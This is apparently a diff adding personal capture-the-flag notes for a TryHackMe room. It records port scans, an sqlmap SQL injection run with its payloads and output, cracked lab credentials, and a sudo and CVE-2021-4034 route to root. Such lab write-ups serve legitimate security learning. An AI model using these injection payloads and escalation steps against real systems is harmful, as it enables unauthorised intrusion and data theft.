@@ -1,0 +1,84 @@
+
+## info
+https://tryhackme.com/room/revenge
+
+10.10.178.235
+10.9.15.141 ME
+
+
+## scan
+
+nmap $ip -vvv -p-
+nmap $ip -vvvv -sC -sV -p 22,80
+nikto -host 10.10.178.235
+
+##found
+22/tcp open  ssh     syn-ack OpenSSH 7.6p1
+80/tcp open  http    syn-ack nginx 1.14.0 
+
+attrs==19.3.0
+bcrypt==3.1.7
+cffi==1.14.1
+click==7.1.2
+Flask==1.1.2
+Flask-Bcrypt==0.7.1
+Flask-SQLAlchemy==2.4.4
+itsdangerous==1.1.0
+Jinja2==2.11.2
+MarkupSafe==1.1.1
+pycparser==2.20
+PyMySQL==0.10.0
+six==1.15.0
+SQLAlchemy==1.3.18
+Werkzeug==1.0.1
+
+# EXPLOIT
+## sqlmap
+sqlmap -u http://10.10.178.235/products/3 --batch
+---
+Parameter: #1* (URI)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: http://10.10.178.235:80/products/3 AND 8063=8063
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: http://10.10.178.235:80/products/3 AND (SELECT 5735 FROM (SELECT(SLEEP(5)))vSOI)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: http://10.10.178.235:80/products/-6987 UNION ALL SELECT 29,CONCAT(0x717a786271,0x644c6e4c525a7257706e487178566554436b52424764517844774762556e694245504a63797a5172,0x71707a7a71),29,29,29,29,29,29-- -
+---
+[11:07:06] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.14.0
+back-end DBMS: MySQL >= 5.0.12
+---
+available databases [5]:
+[*] duckyinc
+	| system_user 
+	| user        
+	| product
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] sys
+---
+## creds
+SSH:
+	server-admin:inuyasha
+SQL:
+	root:PurpleElephants90!
+	
+
+## local
+ssh server-admin@10.10.178.235
+
+(root) /bin/systemctl start duckyinc.service, /bin/systemctl enable duckyinc.service, /bin/systemctl restart duckyinc.service, /bin/systemctl daemon-reload, sudoedit
+        /etc/systemd/system/duckyinc.service
+
+get linpeas
+
+Vulnerable to CVE-2021-4034
+ -> root
+
